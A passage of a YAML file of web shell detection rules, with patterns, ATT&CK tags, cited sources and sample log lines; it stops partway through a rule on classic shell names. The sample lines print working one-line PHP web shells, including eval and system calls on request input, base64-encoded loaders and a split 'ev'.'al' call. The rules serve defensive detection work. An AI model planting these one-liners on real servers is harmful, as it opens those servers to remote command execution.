# Mention patterns for web shells: server-side code that executes request input, obfuscated PHP loaders, known web
# shell names and antivirus family names, tunnelling shells (reGeorg), the command markers of China Chopper, and
# upload tricks used to plant shells. Sources are php-malware-finder, SigmaHQ rules, PayloadsAllTheThings and the
# reGeorg project, cited per entry.
#
# In access logs, web shell names and command parameters are also requested by internet scanners hoping to find an
# existing shell; such requests are attempts, and the response code and whether the file exists decide them.

- id: mention.webshell_php_eval_request_input
  title: PHP eval of request input
  match:
    anchored: 'eval {0,3}\( {0,3}\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\['
  case_sensitive: false
  strength: strong
  attack: [T1505.003]
  telemetry: [any]
  source:
    name: php-malware-finder, DodgyPhp rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: DodgyPhp
  rationale: >-
    From the rule's $execution pattern: evaluating a request variable as PHP code is the one-line web shell
    ('<?php @eval($_POST[x]); ?>', the China Chopper and AntSword server side). Legitimate PHP never evaluates raw
    request input. Seen in WAF, file-integrity and scanner logs.
  examples:
    positive:
      - 'Nov 20 17:00:00 web01 aide: added /var/www/html/up/1.php content: <?php @eval($_POST[''pass'']);?>'
    negative:
      - 'Nov 20 17:00:01 web01 php-fpm[880]: PHP Notice: Undefined index: page in /var/www/html/index.php on line 12 ($_GET[''page''])'
      - 'Nov 20 17:00:02 web01 php-fpm[880]: eval() disabled by suhosin'

- id: mention.webshell_php_exec_request_input
  title: PHP command execution of request input
  match:
    literal:
      - 'system($_get['
      - 'system($_post['
      - 'system($_request['
      - 'system($_cookie['
      - 'passthru($_get['
      - 'passthru($_post['
      - 'passthru($_request['
      - 'shell_exec($_get['
      - 'shell_exec($_post['
      - 'shell_exec($_request['
      - 'assert($_get['
      - 'assert($_post['
      - 'assert($_request['
      - 'popen($_get['
      - 'popen($_post['
      - 'popen($_request['
      - '`$_get['
      - '`$_post['
      - '`$_request['
  case_sensitive: false
  strength: strong
  attack: [T1505.003, T1059.004]
  telemetry: [any]
  source:
    name: php-malware-finder, DodgyPhp rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: DodgyPhp
  rationale: >-
    The no-space forms of the rule's $execution pattern for OS command functions and backticks applied directly to a
    request variable ('<?php system($_GET[''cmd'']); ?>', also the PayloadsAllTheThings upload payloads). These are
    command web shells; spaced variants are not covered by the literal forms.
  examples:
    positive:
      - 'Nov 20 17:01:00 web01 modsecurity: Matched "Operator Rx" against ARGS:file: <?php system($_GET[''cmd'']); ?>'
      - '<?=`$_GET[0]`?>'
      - 'Nov 21 09:02:52 web01 aide: added /var/www/html/up/s.php content: <?php system($_POST[''cmd'']); ?>'
      - 'Nov 21 09:02:53 web01 aide: added /var/www/html/up/s.php content: <?php system($_REQUEST[''cmd'']); ?>'
      - 'Nov 21 09:02:54 web01 aide: added /var/www/html/up/s.php content: <?php system($_COOKIE[''cmd'']); ?>'
      - 'Nov 21 09:02:55 web01 aide: added /var/www/html/up/s.php content: <?php passthru($_GET[''cmd'']); ?>'
      - 'Nov 21 09:02:56 web01 aide: added /var/www/html/up/s.php content: <?php passthru($_POST[''cmd'']); ?>'
      - 'Nov 21 09:02:57 web01 aide: added /var/www/html/up/s.php content: <?php passthru($_REQUEST[''cmd'']); ?>'
      - 'Nov 21 09:02:58 web01 aide: added /var/www/html/up/s.php content: <?php shell_exec($_GET[''cmd'']); ?>'
      - 'Nov 21 09:02:59 web01 aide: added /var/www/html/up/s.php content: <?php shell_exec($_POST[''cmd'']); ?>'
      - 'Nov 21 09:03:00 web01 aide: added /var/www/html/up/s.php content: <?php shell_exec($_REQUEST[''cmd'']); ?>'
      - 'Nov 21 09:03:01 web01 aide: added /var/www/html/up/s.php content: <?php assert($_GET[''cmd'']); ?>'
      - 'Nov 21 09:03:02 web01 aide: added /var/www/html/up/s.php content: <?php assert($_POST[''cmd'']); ?>'
      - 'Nov 21 09:03:03 web01 aide: added /var/www/html/up/s.php content: <?php assert($_REQUEST[''cmd'']); ?>'
      - 'Nov 21 09:03:04 web01 aide: added /var/www/html/up/s.php content: <?php popen($_GET[''cmd'']); ?>'
      - 'Nov 21 09:03:05 web01 aide: added /var/www/html/up/s.php content: <?php popen($_POST[''cmd'']); ?>'
      - 'Nov 21 09:03:06 web01 aide: added /var/www/html/up/s.php content: <?php popen($_REQUEST[''cmd'']); ?>'
      - 'Nov 21 09:03:07 web01 aide: added /var/www/html/up/s.php content: <?=`$_POST[''c'']`?>'
      - 'Nov 21 09:03:08 web01 aide: added /var/www/html/up/s.php content: <?=`$_REQUEST[''c'']`?>'
    negative:
      - 'Nov 20 17:01:01 web01 php-fpm[880]: PHP Warning: system(): Unable to fork [/usr/bin/convert in.png out.jpg]'
      - 'Nov 20 17:01:02 web01 php-fpm[880]: $page = htmlspecialchars($_GET[''page''])'

- id: mention.webshell_php_eval_decoder
  title: 'PHP eval around base64_decode, gzinflate, gzuncompress, gzdecode or str_rot13'
  match:
    anchored: 'eval {0,3}\( {0,3}(?:base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13) {0,3}\('
  case_sensitive: false
  strength: medium
  attack: [T1505.003, T1027.010, T1140]
  telemetry: [any]
  source:
    name: php-malware-finder, DodgyPhp rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: DodgyPhp
  rationale: >-
    eval(base64_decode(...)), eval(gzinflate(...)) and similar are how PHP backdoors and injected loaders hide their
    code. Some commercial plugins obfuscate licensing code the same way, so it is medium.
  examples:
    positive:
      - 'Nov 20 17:02:00 web01 aide: changed /var/www/html/wp-content/plugins/x/x.php: eval(gzinflate(base64_decode(''7b1rcxs5ki76'')));'
    negative:
      - 'Nov 20 17:02:01 web01 php-fpm[880]: $data = base64_decode($payload); json_decode($data);'
      - 'Nov 20 17:02:02 web01 php-fpm[880]: evaluation of template cache complete'

- id: mention.webshell_php_split_eval
  title: PHP eval name split by string concatenation
  match:
    literal: ['''ev''.''al''']
  case_sensitive: false
  strength: strong
  attack: [T1505.003, T1027]
  telemetry: [any]
  source:
    name: php-malware-finder, ObfuscatedPhp rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: ObfuscatedPhp
  rationale: >-
    Building the word eval from pieces ('ev'.'al') exists only to dodge scanners; the rule ties it to the b374k
    shell. Legitimate code calls eval directly or not at all.
  examples:
    positive:
      - '$f = ''ev''.''al''; $f($_POST[''c'']);'
    negative:
      - '$name = ''eval''.''uation''; echo $name;'
      - 'Nov 20 17:03:00 web01 app[700]: evaluation complete'

- id: mention.webshell_base64_php_markers
  title: 'Base64 of ''base64_decode'' inside text'
  match:
    literal:
      - 'YmFzZTY0X2RlY29kZ'
  case_sensitive: true
  strength: medium
  attack: [T1505.003, T1027.010]
  telemetry: [any]
  source:
    name: php-malware-finder, b64 rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: b64
  rationale: >-
    Base64 of 'eval(' and of 'base64_decode', the layered-encoding marker of PHP droppers and of web shell clients
    (China Chopper, AntSword) that send base64 PHP in POST bodies. Base64 data matches these 7 and 17 characters by
    chance only rarely; WAF and request-body logs are where they appear.
  examples:
    positive:
      - 'Nov 20 17:04:00 waf01 modsec: ARGS:z0 = QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejFdKSk7'
    negative:
      - 'Nov 20 17:04:01 waf01 modsec: ARGS:token = c2Vzc2lvbi1pZA=='
      - 'Nov 20 17:04:02 web01 app[700]: blob=ZXhhbXBsZS5vcmc='

- id: mention.webshell_base64_eval_marker
  title: Base64 of 'eval(' inside text
  match:
    literal: ['ZXZhbCg']
  case_sensitive: true
  strength: weak
  attack: [T1505.003, T1027.010]
  telemetry: [any]
  source:
    name: php-malware-finder, b64 rule (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: b64
  rationale: >-
    Base64 of 'eval(' at one alignment. Seven characters can occur in unrelated base64 data, so it is a weak
    candidate on its own; with a PHP context or the base64_decode marker it supports a web shell lead.
  examples:
    positive:
      - 'Nov 20 17:04:03 waf01 modsec: ARGS:z0 = ZXZhbCgkX1BPU1RbInoxIl0pOw=='
    negative:
      - 'Nov 20 17:04:04 waf01 modsec: ARGS:token = c2Vzc2lvbi1pZA=='
      - 'Nov 20 17:04:05 web01 app[700]: blob=ZXhhbXBsZS5vcmc='

- id: mention.webshell_base64_eval_request
  title: Base64 of 'eval($_POST', 'eval($_REQUEST' or 'eval($_GET' at any byte alignment
  match:
    literal: ['ZXZhbCgkX1BPU1Rb', 'V2YWwoJF9QT1NUW', 'ldmFsKCRfUE9TVF', 'ZXZhbCgkX1JFUVVFU1Rb', 'V2YWwoJF9SRVFVRVNUW', 'ldmFsKCRfUkVRVUVTVF', 'ZXZhbCgkX0dFVF', 'V2YWwoJF9HRVRb', 'ldmFsKCRfR0VUW']
  case_sensitive: true
  strength: medium
  attack: [T1505.003, T1027.010]
  telemetry: [any]
  source:
    name: php-malware-finder, DodgyPhp and b64 rules (jvoisin)
    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
    license: LGPL-3.0
    upstream_id: b64
  rationale: >-
    The rule's eval-of-request-input pattern in base64 (computed at the three byte alignments, fully determined
    characters only): an encoded one-line web shell inside an upload, a POST body or a WAF log. Benign uses of this
    exact encoded text are rare; it is medium because base64 text can still collide by chance.
  examples:
    positive:
      - 'Nov 20 17:04:06 waf01 modsec: ARGS:upload = PD9waHAgQGV2YWwoJF9QT1NUWyJ4Il0pOz8+'
    negative:
      - 'Nov 20 17:04:07 waf01 modsec: ARGS:token = c2Vzc2lvbi1pZA=='
      - 'Nov 20 17:04:08 web01 app[700]: blob=ZXhhbXBsZS5vcmc='

- id: mention.webshell_php_shell_names
  title: Classic PHP web shell names
  match:
    literal:
      - 'r57shell'
      - 'fx29shell'
  case_sensitive: false
  strength: medium
  attack: [T1505.003]
  telemetry: [any]
  source:
    name: php-malware-finder, DodgyStrings and Websites rules (jvoisin)
